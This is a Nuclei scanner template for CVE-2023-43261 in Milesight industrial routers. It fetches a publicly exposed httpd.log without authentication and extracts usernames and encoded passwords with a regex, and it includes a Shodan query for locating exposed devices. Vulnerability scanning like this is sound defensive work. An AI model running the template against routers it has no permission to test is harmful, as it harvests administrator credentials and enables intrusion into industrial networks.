http:
- extractors:
  - regex:
    - '"username":"([^"]+)","password":"(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)"'
    type: regex
  max-size: 5000
  method: GET
  path:
  - '{{BaseURL}}/lang/log/httpd.log'
id: CVE-2023-43261
info:
  author: gy741
  classification:
    cpe: cpe:2.3:o:milesight:ur5x_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43261
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-532
    epss-percentile: 0.73134
    epss-score: 0.00476
  description: 'A critical security vulnerability has been identified in Milesight
    Industrial Cellular Routers, compromising the security of sensitive credentials
    and permitting unauthorized access. This vulnerability stems from a misconfiguration
    that results in directory listing being enabled on the router systems, rendering
    log files publicly accessible. These log files, while containing sensitive information
    such as admin and other user passwords (encrypted as a security measure), can
    be exploited by attackers via the router''s web interface. The presence of a hardcoded
    AES secret key and initialization vector (IV) in the JavaScript code further exacerbates
    the situation, facilitating the decryption of these passwords. This chain of vulnerabilities
    allows malicious actors to gain unauthorized access to the router.

    '
  metadata:
    max-request: 1
    product: ur5x_firmware
    shodan-query: http.html:rt_title
    vendor: milesight
    verified: true
  name: Milesight Routers - Information Disclosure
  reference:
  - https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
  - https://github.com/win3zz/CVE-2023-43261
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43261
  - http://milesight.com
  - http://ur5x.com
  severity: high
  tags: cve,cve2023,router,milesight,disclosure,unauth,iot
